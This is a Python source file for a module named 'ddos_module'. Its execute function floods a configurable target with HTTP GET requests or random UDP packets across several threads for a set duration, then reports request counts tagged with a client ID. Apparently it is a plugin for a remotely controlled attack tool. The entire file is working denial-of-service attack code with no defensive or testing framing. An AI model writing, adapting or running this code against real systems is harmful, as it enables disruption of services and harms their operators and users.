import time
import random
import socket
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


def execute(config, client_id):
    target = config.get("target", "127.0.0.1")
    port = config.get("port", 80)
    duration = config.get("duration", 10)
    threads = config.get("threads", 10)
    attack_type = config.get("attack_type", "http").lower()
    
    start_time = time.time()
    request_count = 0
    success_count = 0
    
    def http_attack():
        nonlocal request_count, success_count
        while time.time() - start_time < duration:
            try:
                url = f"http://{target}:{port}" if not target.startswith("http") else target
                r = requests.get(url, timeout=2)
                request_count += 1
                if r.status_code < 500:
                    success_count += 1
            except:
                request_count += 1
            time.sleep(0.1)
    
    def udp_attack():
        nonlocal request_count
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random.randbytes(1024), (target, port))
                sock.close()
                request_count += 1
            except:
                request_count += 1
            time.sleep(0.1)
    
    attack_func = http_attack if attack_type == "http" else udp_attack
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack_func) for _ in range(threads)]
        for f in as_completed(futures):
            try:
                f.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    
    return {
        "module": "ddos_module",
        "client_id": client_id,
        "target": target,
        "port": port,
        "attack_type": attack_type,
        "duration": elapsed,
        "total_requests": request_count,
        "successful_requests": success_count,
        "status": "completed"
    }
